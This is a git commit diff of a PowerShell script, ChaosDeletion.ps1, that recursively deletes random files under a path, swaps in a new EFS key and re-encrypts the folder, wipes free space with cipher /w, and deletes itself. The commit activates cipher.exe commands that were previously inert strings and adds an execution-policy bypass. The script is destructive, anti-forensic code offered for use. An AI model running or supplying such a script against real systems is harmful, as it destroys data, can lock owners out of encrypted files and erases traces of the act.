357094ef5b35d777a2640857000a6592e1681d7d
SCIS Security <dchow@xtecsystems.com>
2017-02-24 07:54:04 -0600

    Update ChaosDeletion.ps1

--- ChaosDeletion.ps1
+++ ChaosDeletion.ps1
@@ -1,6 +1,7 @@
-﻿<#
+<#
 ChaosDeletion v1.0 02/23/2017
 dchow[AT]xtecsystems.com
+www.xtecsystems.com
 Recusrively selects a file from your input level directory and does the following:
 
 1) Deletes the file
@@ -19,7 +20,8 @@ Why?
 -If you're using this against 
 
 Requirements:
-
+Set-ExecutionPolicy bypass
+User Permissions Required for Write Access
 
 Parameters:
 -path - The starting path that you want to recurse random file deletion AND EFS key swapping
@@ -65,15 +67,16 @@ While ($fileCount -gt 0)
 #Also encrypts folder and updates the key (at least for local system)
 #For remote systems you'll have to use invoke-command cmdlet with PowerShell
 Write-Host "Generating new EFS key" -ForegroundColor Yellow -BackgroundColor Black
-"cipher.exe /k"
+cipher.exe /k
 Write-Host "Updating Target Folder with New EFS Key" -ForegroundColor Yellow -BackgroundColor Black
-"cipher.exe /u $path" 
+cipher.exe /u $path 
 Write-Host "Forcing Encryption of $path with new key" -ForegroundColor Red -BackgroundColor Black
-"cipher.exe /e /f /a $path"
+cipher.exe /e /f /a $path
 
 #Self-Destruct Script Function After Completion
 #Ref: https://www.safaribooksonline.com/library/view/windows-powershell-cookbook/9780596528492/ch14s05.html
 Remove-Item $MyInvocation.InvocationName -ErrorAction SilentlyContinue
+cipher.exe /w $path
 
 #exit
  Exit
